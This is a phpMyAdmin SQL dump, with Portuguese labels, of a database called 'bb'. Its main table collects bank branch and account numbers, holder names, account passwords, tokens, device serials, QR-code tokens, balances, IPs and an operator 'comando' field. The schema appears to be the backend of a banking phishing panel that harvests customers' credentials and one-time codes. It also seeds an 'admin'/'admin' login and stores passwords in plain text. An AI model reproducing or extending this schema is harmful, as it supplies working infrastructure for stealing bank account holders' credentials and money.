-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Tempo de geração: 09-Maio-2024 às 14:11
-- Versão do servidor: 10.4.11-MariaDB
-- versão do PHP: 7.4.5

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `bb`
--

-- --------------------------------------------------------

--
-- Estrutura da tabela `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `usuario` varchar(200) NOT NULL,
  `senha` varchar(200) NOT NULL,
  `ip` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Extraindo dados da tabela `admin`
--

INSERT INTO `admin` (`id`, `usuario`, `senha`, `ip`) VALUES
(1, 'admin', 'admin', '');

-- --------------------------------------------------------

--
-- Estrutura da tabela `backup`
--

CREATE TABLE `backup` (
  `id` int(11) NOT NULL,
  `usuario` varchar(200) NOT NULL,
  `senha` varchar(200) NOT NULL,
  `data` varchar(200) NOT NULL,
  `tipo` varchar(200) NOT NULL,
  `device` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estrutura da tabela `infos`
--

CREATE TABLE `infos` (
  `id` int(11) NOT NULL,
  `agencia` varchar(200) NOT NULL,
  `conta` varchar(200) NOT NULL,
  `titular` varchar(200) NOT NULL,
  `titular_01` varchar(200) NOT NULL,
  `titular_02` varchar(200) NOT NULL,
  `tipo_conta` varchar(200) NOT NULL,
  `senha` varchar(200) NOT NULL,
  `token` varchar(200) NOT NULL,
  `serial` varchar(200) NOT NULL,
  `comando` varchar(200) NOT NULL,
  `saldo` varchar(200) NOT NULL,
  `estado` varchar(200) NOT NULL,
  `cidade` varchar(200) NOT NULL,
  `qrCodeToken` varchar(200) NOT NULL,
  `qrcode` longtext NOT NULL,
  `ip` varchar(200) NOT NULL,
  `ads` varchar(200) NOT NULL,
  `datahora` varchar(200) NOT NULL,
  `dispositivo` varchar(200) NOT NULL,
  `status` varchar(200) NOT NULL,
  `variacao` varchar(200) NOT NULL,
  `tabela` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estrutura da tabela `tabela_token`
--

CREATE TABLE `tabela_token` (
  `id` int(11) NOT NULL,
  `conta` varchar(200) NOT NULL,
  `token` varchar(200) NOT NULL,
  `tipo` varchar(200) NOT NULL,
  `datahora` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Estrutura da tabela `visitas`
--

CREATE TABLE `visitas` (
  `id` int(11) NOT NULL,
  `data_inicio` datetime DEFAULT NULL,
  `data_final` datetime DEFAULT NULL,
  `client_id` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Índices para tabelas despejadas
--

--
-- Índices para tabela `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Índices para tabela `backup`
--
ALTER TABLE `backup`
  ADD PRIMARY KEY (`id`);

--
-- Índices para tabela `infos`
--
ALTER TABLE `infos`
  ADD PRIMARY KEY (`id`);

--
-- Índices para tabela `tabela_token`
--
ALTER TABLE `tabela_token`
  ADD PRIMARY KEY (`id`);

--
-- Índices para tabela `visitas`
--
ALTER TABLE `visitas`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT de tabelas despejadas
--

--
-- AUTO_INCREMENT de tabela `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT de tabela `backup`
--
ALTER TABLE `backup`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `infos`
--
ALTER TABLE `infos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `tabela_token`
--
ALTER TABLE `tabela_token`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `visitas`
--
ALTER TABLE `visitas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
